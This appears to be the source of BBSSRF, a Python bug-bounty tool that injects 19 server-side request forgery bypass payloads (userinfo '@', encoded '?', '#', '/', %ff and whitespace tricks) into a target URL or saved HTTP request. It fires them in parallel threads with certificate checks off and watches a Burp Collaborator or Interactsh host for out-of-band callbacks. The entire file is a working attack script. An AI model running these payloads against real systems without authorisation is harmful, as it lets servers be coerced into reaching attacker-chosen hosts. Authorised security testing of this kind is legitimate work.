#!/usr/bin/env python3

import time
import sys
import threading
import argparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


NC = '\033[0m'
RED = '\033[91m'
OKBLUE = '\033[94m'
GREEN = '\033[92m'
BOLD = '\033[1m'


print(f"""
{BOLD}

██████╗ ██████╗ ███████╗███████╗██████╗ ███████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝
██████╔╝██████╔╝███████╗███████╗██████╔╝█████╗  
██╔══██╗██╔══██╗╚════██║╚════██║██╔══██╗██╔══╝  
██████╔╝██████╔╝███████║███████║██║  ██║██║     
╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝    v1.0

{NC}
""")

parser = argparse.ArgumentParser(
    description=f"""
    \n{BOLD}BBSSRF - Bug Bounty SSRF. Check OOB connection in seconds{NC}
    """, 
    usage=f"""
    \t{BOLD}Single URL:{NC}
    \t\tpython3 bbssrf.py -b http://collaborator.com -u http://example.com/index.php?url=BBSSRF 
    \t{BOLD}Request File:{NC}
    \t\tpython3 bbssrf.py -b http://collaborator.com -r request.req
    \t{BOLD}Multiple URLs:{NC}
    \t\tpython3 bbssrf.py -b http://collaborator.com -f urllist.txt
    \t{BOLD}STDIN input:{NC}
    \t\tcat urllist.txt | python3 bbssrf.py -b http://collaborator.com -s
    \t{BOLD}Proxy{NC}
    \t\tpython3 bbssrf.py -b http://collaborator.com -r request.req -x http://127.0.0.1:8080
    """)

parser.add_argument('-b', help='Interactsh-client or burp collaborator for checking SSRF')
parser.add_argument('-f', help='List of URLs to scan')
parser.add_argument('-generate', help='Generate payloads', action='count')
parser.add_argument('-p', help='PID - payload ID. Detail of the payload used for OOB connection. supported with "-u" and "-r"')
parser.add_argument('-r', help='Request file to scan')
parser.add_argument('-s', help='STDIN', action='count')
parser.add_argument('-u', help='URL to scan')
parser.add_argument('-v', help='Verbose output',action='count')
parser.add_argument('-x', help='proxy')
args = parser.parse_args()


def get_payload():
    if args.u:
        check_full_url = check_http(args.u)
        if check_full_url == False:
            print("Enter URL with 'http:// or https://'")
            exit()
        check_burp_url = check_http(args.b)
        if check_burp_url == False:
            print("Enter Interactsh-client or burp collaborator with 'http:// or https://'")
            exit()
        if "BBSSRF" not in args.u:
            print("URL must contain 'BBSSRF' in the testing field")
            exit()

        host_remove_http = remove_http(args.u)
        burp_remove_http = remove_http(args.b)
        
        ssrf_payloads = generate_ssrf_payloads(host_remove_http,burp_remove_http)
        if args.generate:
            print(f"{BOLD}Generating Payloads...{NC}\n")
            for i in range(len(ssrf_payloads)):
                print(ssrf_payloads[i])
            exit()
        try:
            payload_data = int(args.p) - 1
            print(f"{OKBLUE}Payload used: {RED}",ssrf_payloads[payload_data],f"{NC}\n")
        except:
            print("Enter correct payload ID")
        exit()
    elif args.r:
        valu = open(args.r,'rt')
        rev = valu.read()                       
        full_list_request = rev.split('\n')      
        full_request_allHeaders = full_list_request[1:-2] 

        for i in range(len(full_request_allHeaders)):
            full_request_allHeaders = full_list_request[1:-2-i]
            if full_request_allHeaders[-1] == "":
                continue
            else:
                break

        full_request_Headers = dict()
        for sub in full_request_allHeaders:
            key, *val = sub.split(': ')
            full_request_Headers[key] = val[0].strip()
                
        payload_req_host= full_request_Headers['Host']
        burp_remove_http = remove_http(args.b)
        file_gen_payload = generate_ssrf_payloads(payload_req_host,burp_remove_http)
        if args.generate:
            print(f"{BOLD}Generating Payloads...{NC}\n")
            for i in range(len(file_gen_payload)):
                print(file_gen_payload[i])
            exit()
        try:
            payload_data = int(args.p) - 1
            print(f"{OKBLUE}Payload used: {RED}",file_gen_payload[payload_data],f"{NC}\n")
        except:
            print("Enter correct payload value")
        exit()
    else:
        print("Not supported")
        exit()

def ssrf_completed():
    time.sleep(10)
    print(f"\n{BOLD}SSRF testing completed...wait for few seconds...{NC}\n")


def generate_ssrf_payloads(host,burp):
    payloads = [
        f"http://1.{burp}",
        f"//2.{burp}",
        f"http://3.{host}.{burp}",
        f"http://4.{burp}?{host}",
        f"http://5.{burp}/{host}",
        f"http://6.{burp}%ff@{host}",
        f"http://7.{burp}%ff.{host}",
        f"http://{host}%25253F@8.{burp}",
        f"http://{host}%253F@9.{burp}",
        f"http://{host}%252F@10.{burp}",
        f"http://{host}%3F@11.{burp}",
        f"http://{host}@12.{burp}",
        f"http://13.{burp}#{host}",
        f"http://14.{burp}%23{host}",
        f"http://15.{burp}%23@{host}",
        f"http://16.{burp}%2523{host}",
        f"http://17.{burp}:80@{host}",
        f"http://18.{burp}%20@{host}",
        f"http://19.{burp}%09@{host}"
    ]
    return payloads

def remove_http(arg_host):
    if arg_host.startswith("http://"):
        host = arg_host.split('http://')[1].split('/')[0]
        return host
    elif arg_host.startswith("https://"):
        host = arg_host.split('https://')[1].split('/')[0]
        return host
    else:
        return False


def check_http(arg_host):
    if arg_host.startswith("http://"):
        return True
    elif arg_host.startswith("https://"):
        return True
    else:
        return False

def exploit_url_ssrf(arg_host,ssrf_payloads):
    
    final_payloads = arg_host.replace("BBSSRF",ssrf_payloads)
    if args.v:
        print(final_payloads)
    try:
        if args.x:
            ssrf_request = requests.get(final_payloads, proxies=proxy, verify=False, timeout=10)
        else:
            ssrf_request = requests.get(final_payloads, verify=False, timeout=10)
    except:
        pass


def exploit_file_ssrf(final_req_host,full_request_Headers,full_request_postData_dict,file_gen_payload,full_request_method):
    if args.v:
        print(file_gen_payload)
    if full_request_method == "POST":
        try:
            if args.x:
                ssrf_request = requests.post(final_req_host, headers=full_request_Headers, data=full_request_postData_dict, proxies=proxy, verify=False, timeout=10)
            else:
                ssrf_request = requests.post(final_req_host, headers=full_request_Headers, data=full_request_postData_dict, verify=False, timeout=10)
        except:
            pass
    elif full_request_method == "GET":
        try:
            if args.x:
                ssrf_request = requests.get(final_req_host, headers=full_request_Headers, proxies=proxy, verify=False, timeout=10)
            else:
                ssrf_request = requests.get(final_req_host, headers=full_request_Headers, verify=False, timeout=10)
        except:
            pass
    else:
        print("Method not supported")

def get_host_from_File():
    check_burp_url = check_http(args.b)
    if check_burp_url == False:
        print("Enter collaborator with 'http:// or https://'")
        exit()
    burp_remove_http = remove_http(args.b)  
    valu = open(args.r,'rt')
    rev = valu.read()                      

    if not "BBSSRF" in rev:
        print("Request must contain 'BBSSRF' in the testing field")
        exit()


    full_list_request = rev.split('\n')      # split by new line
    full_request_allHeaders = full_list_request[1:-2] # all headers except index 0 and -1
    sample_full_request_postData = full_list_request[-1].split('&')

    for  i in range(len(full_list_request)):
        sample_full_request_postData = full_list_request[-1-i].split('&')
        if sample_full_request_postData[0] == "":
            continue
        else:
            break

    for i in range(len(full_request_allHeaders)):
        full_request_allHeaders = full_list_request[1:-2-i]
        if full_request_allHeaders[-1] == "":
            continue
        else:
            break
    full_request_Headers = dict()
    for sub in full_request_allHeaders:
        key, *val = sub.split(': ')
        full_request_Headers[key] = val[0].strip()
        
    payload_req_host= full_request_Headers['Host']
    file_gen_payload = generate_ssrf_payloads(payload_req_host,burp_remove_http)
    full_request_path = full_list_request[0][4::].split('HTTP')[0].strip()
    final_req_host= "https://"+full_request_Headers['Host']+full_request_path
    full_request_method = full_list_request[0][0:4].strip() 
    print(f"{OKBLUE}Host : {RED}",payload_req_host,f"{NC}")
    print(f"{OKBLUE}Iserver : {RED}",burp_remove_http,f"{NC}")
    print(f"{OKBLUE}HTTP Method : {RED}",full_request_method,f"{NC}")
    print(f"{GREEN}>>{NC}",len(file_gen_payload)," Payloads Generated")
    print(f"{GREEN}>>{NC} Check {RED}{args.b}{NC} for OOB connection\n")

    if full_request_method == "POST":
        for i in range(len(file_gen_payload)):
            replaced_bbssrf =  rev.replace('BBSSRF',file_gen_payload[i])
            full_list_request = replaced_bbssrf.split('\n') 
            full_request_postData = full_list_request[-1].split('&') 

            for  i in range(len(full_list_request)):
                full_request_postData = full_list_request[-1-i].split('&')
                if full_request_postData[0] == "":
                    continue
                else:
                    break

            full_request_postData_dict = dict()
            for sub_dict in full_request_postData:
                key, *val = sub_dict.split('=')
                full_request_postData_dict[key] = val[0].strip()
            full_request_allHeaders = full_list_request[1:-2]

            for i in range(len(full_request_allHeaders)):
                full_request_allHeaders = full_list_request[1:-2-i]
                if full_request_allHeaders[-1] == "":
                    continue
                else:
                    break

            full_request_Headers = dict()
            for sub in full_request_allHeaders:
                key, *val = sub.split(': ')
                full_request_Headers[key] = val[0].strip()
            full_request_Headers.pop('Host')
            full_request_content_type = full_request_Headers['Content-Type']
            
            if 'x-www-form-urlencoded' not in full_request_content_type:
                print("Content type not supported")
                exit()
            
            exploit = threading.Thread(target=exploit_file_ssrf,args=(final_req_host,full_request_Headers,full_request_postData_dict,replaced_bbssrf,full_request_method))
            exploit.start()
            
    elif full_request_method == "GET":
        for i in range(len(file_gen_payload)):
            replaced_bbssrf =  rev.replace('BBSSRF',file_gen_payload[i])
            full_list_request = replaced_bbssrf.split('\n') 
            
            full_request_allHeaders = full_list_request[1:-2]
            
            full_request_Headers = dict()
            for sub in full_request_allHeaders:
                key, *val = sub.split(': ')
                full_request_Headers[key] = val[0].strip()
            full_request_path = full_list_request[0][4::].split('HTTP')[0].strip()
            final_req_host= "https://"+full_request_Headers['Host']+full_request_path
            full_request_Headers.pop('Host')
            full_request_postData_dict = dict()
            exploit = threading.Thread(target=exploit_file_ssrf,args=(final_req_host,full_request_Headers,'',replaced_bbssrf,full_request_method))
            exploit.start()
        
        
    else:
        print("Method not suported")
    ssrf_completed() 

 

def get_host_from_URL(arg_host,arg_burp):
    check_full_url = check_http(arg_host)
    if check_full_url == False:
        print("Enter URL with 'http:// or https://'")
        exit()
    check_burp_url = check_http(arg_burp)
    if check_burp_url == False:
        print("Enter collaborator with 'http:// or https://'")
        exit()
    if "BBSSRF" not in arg_host:
        print("URL must contain 'BBSSRF' in the testing field")
        exit()

    host_remove_http = remove_http(arg_host)
    burp_remove_http = remove_http(arg_burp)

    ssrf_payloads = generate_ssrf_payloads(host_remove_http,burp_remove_http)
    
    print(f"\n{OKBLUE}Host : {RED}",host_remove_http,f"{NC}")
    print(f"{OKBLUE}Iserver : {RED}",burp_remove_http,f"{NC}")
    print(f"{OKBLUE}HTTP Method : {RED}GET{NC}")
    print(f"{GREEN}>> {NC}Generating payloads")
    print(f"{GREEN}>>{NC}",len(ssrf_payloads)," Payloads Generated")
    print(f"{GREEN}>>{NC} Check {RED}{args.b}{NC} for OOB connection\n")
    
    for i in range(len(ssrf_payloads)):
        exploit = threading.Thread(target=exploit_url_ssrf,args=(arg_host,ssrf_payloads[i]))
        exploit.start()

def get_host_from_URL_File():
    url_files = open(args.f,'rt')
    for line in url_files:
        url_to_test = line.rstrip()
        get_host_from_URL(url_to_test,args.b)





def url_file_exp():
    get_host_from_URL_File()
    ssrf_completed()

def url_exp():
    get_host_from_URL(args.u,args.b)
    ssrf_completed()

def url_from_stdin():
    stdin_url_list = sys.stdin.readlines()
    split_stdin_url_list = stdin_url_list
    for line in split_stdin_url_list:
        url_to_test = line.rstrip()
        get_host_from_URL(url_to_test,args.b)
    ssrf_completed()


proxy = {"http":args.x,"https":args.x}

if args.x:
    check_http_full = check_http(args.x) 
    if check_http_full == False:
        print("Enter proxy with 'http:// or https://'")
        exit()

if not (args.r or args.u or args.f or args.s):
    parser.error(f"""\n\tURL or request is not provided\n\thelp - python bbssrf.py -h""")
if not (args.b):
    parser.error(f"""\n\tInteractsh-client or burp collaborator not provided\n\thelp - python bbssrf.py -h""")
if (args.r and args.u):
    parser.error(f"""\n\tprovide either URL or Request file\n\thelp - python bbssrf.py -h""")
if (args.u and args.f):
    parser.error(f"""\n\tprovide either URL or URLs list\n\thelp - python bbssrf.py -h""")
if (args.f and args.r):
    parser.error(f"""\n\tprovide either URL list or Request file\n\thelp - python bbssrf.py -h""")


if args.p:
    get_payload()
if args.generate:
    get_payload()
if args.u:
    url_exp()
elif args.r:
    get_host_from_File()
elif args.f:
    url_file_exp()
elif args.s:
    url_from_stdin()



